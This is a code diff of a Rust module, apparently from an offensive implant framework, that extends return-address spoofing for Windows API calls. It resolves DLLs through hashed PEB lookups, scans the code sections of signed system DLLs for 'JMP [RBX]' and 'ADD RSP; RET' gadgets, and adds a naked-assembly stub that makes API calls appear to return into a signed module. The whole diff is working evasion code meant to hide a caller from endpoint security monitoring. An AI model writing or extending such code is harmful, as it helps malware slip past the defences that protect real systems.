@@ -42,7 +42,8 @@
 //! — exactly the state the API expects after a `call`.
 
 use core::arch::naked_asm;
-use core::ffi::c_void;
+
+use specter_core::fnv::fnv1a64_wide_ascii_ci;
 
 /// Spoofed two-argument API call through a `JMP [RBX]` gadget.
 ///
@@ -84,22 +85,104 @@ pub unsafe extern "C" fn spt_retspoof_continue() {
     naked_asm!("pop rbx", "pop r11", "jmp r11",);
 }
 
-/// Resolve a `JMP [RBX]` gadget in a module's `.text` by scanning for the
-/// `FF 23` bytes. The original project searches several signed modules
-/// (kernel32 first, then kernelbase/bcrypt/advapi32/user32/iphlpapi/winhttp);
-/// this resolves kernel32 — the first in the original's list and present on
-/// every supported Windows. Extending the list is a one-line change when a
-/// second module is ever needed.
+/// Resolve a return-spoofing gadget: the original project's signed-module
+/// list (kernel32, kernelbase, bcrypt, advapi32, user32, iphlpapi — PEB
+/// lookups only, absent modules are skipped rather than mapped), each
+/// scanned for `JMP [RBX]` first, then for the `ADD RSP, imm8; RET`
+/// fallback. The winhttp retry of the original (its gate waits for the
+/// transport's lazy load) is not needed: kernel32 always carries `FF 23`
+/// on supported Windows, so the list only ever walks past it when something
+/// unusual is going on.
+///
+/// Returns `(address, imm8)`: `imm8 == 0` means the `JMP [RBX]` harness,
+/// nonzero the `ADD RSP` one.
 ///
 /// # Safety
 ///
-/// `module` must be a resolved, mapped module base with intact headers.
-pub unsafe fn resolve_gadget(module: *mut c_void) -> Option<usize> {
-    if module.is_null() {
-        return None;
+/// `modules` must be resolved, mapped module bases with intact headers.
+pub unsafe fn resolve_gadget(
+    peb: *const specter_core::peb::Peb,
+    force_addrsp: bool,
+) -> Option<(usize, u8)> {
+    const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");
+    const H_KERNELBASE: u64 = fnv1a64_wide_ascii_ci("kernelbase.dll");
+    const H_BCRYPT: u64 = fnv1a64_wide_ascii_ci("bcrypt.dll");
+    const H_ADVAPI32: u64 = fnv1a64_wide_ascii_ci("advapi32.dll");
+    const H_USER32: u64 = fnv1a64_wide_ascii_ci("user32.dll");
+    const H_IPHLPAPI: u64 = fnv1a64_wide_ascii_ci("iphlpapi.dll");
+    for hash in [
+        H_KERNEL32,
+        H_KERNELBASE,
+        H_BCRYPT,
+        H_ADVAPI32,
+        H_USER32,
+        H_IPHLPAPI,
+    ] {
+        let module = specter_core::peb::find_module(peb, hash);
+        if module.is_null() {
+            continue;
+        }
+        let Some((text, len)) = specter_core::peb::find_section(module, b".text") else {
+            continue;
+        };
+        let text_bytes = core::slice::from_raw_parts(text, len);
+        if !force_addrsp {
+            if let Some(off) = specter_core::retspoof::find_jmp_rbx(text_bytes) {
+                return Some((text as usize + off, 0));
+            }
+        }
+        if let Some((off, imm)) = specter_core::retspoof::find_add_rsp_ret(text_bytes) {
+            return Some((text as usize + off, imm));
+        }
     }
-    let (text, len) = specter_core::peb::find_section(module, b".text")?;
-    let text_bytes = core::slice::from_raw_parts(text, len);
-    let offset = specter_core::retspoof::find_jmp_rbx(text_bytes)?;
-    Some(text as usize + offset)
+    None
+}
+
+/// Spoofed two-argument API call through an `ADD RSP, imm8; RET` gadget
+/// (`imm ≡ 8 mod 16`, enforced by the scan — see `specter_core::retspoof`).
+///
+/// ```text
+/// ; entry: RCX = api, RDX = gadget, R8 = imm8, R9 = arg1,
+/// ;        [rsp+8] = arg2, [rsp] = real return address (RSP ≡ 8 mod 16)
+/// mov  rax, rcx          ; api
+/// mov  r11, rdx          ; gadget
+/// mov  r10, [rsp + 8]    ; arg2 (read before the stack moves)
+/// sub  rsp, r8           ; junk zone: the landing stays the ORIGINAL slot
+/// push r11               ; fake return address = gadget (in a signed DLL)
+/// mov  rcx, r9           ; arg1
+/// mov  rdx, r10          ; arg2
+/// jmp  rax               ; API entry: [rsp] = gadget, RSP ≡ 8 mod 16
+/// ```
+///
+/// The API's `RET` lands on the gadget with `RSP` back at the junk zone;
+/// `ADD RSP, imm8` walks up exactly `imm + 8` bytes — the original return
+/// slot — and the gadget's `RET` returns to the real caller with the stack
+/// in a normal post-call state. No continuation address and no register
+/// survives that the API must preserve: only volatile registers are touched
+/// and RBX is never used.
+///
+/// # Safety
+///
+/// `gadget` must be the address of an `ADD RSP, imm8; RET` instruction
+/// inside a mapped signed DLL with `imm ≡ 8 (mod 16)`, `api` a valid
+/// two-argument function, and `imm` the gadget's imm8.
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn spt_spoof_call2_addrsp(
+    api: usize,
+    gadget: usize,
+    imm: usize,
+    arg1: usize,
+    arg2: usize,
+) -> usize {
+    naked_asm!(
+        "mov  rax, rcx",
+        "mov  r11, rdx",
+        "mov  r10, [rsp + 8]",
+        "sub  rsp, r8",
+        "push r11",
+        "mov  rcx, r9",
+        "mov  rdx, r10",
+        "jmp  rax",
+    );
 }
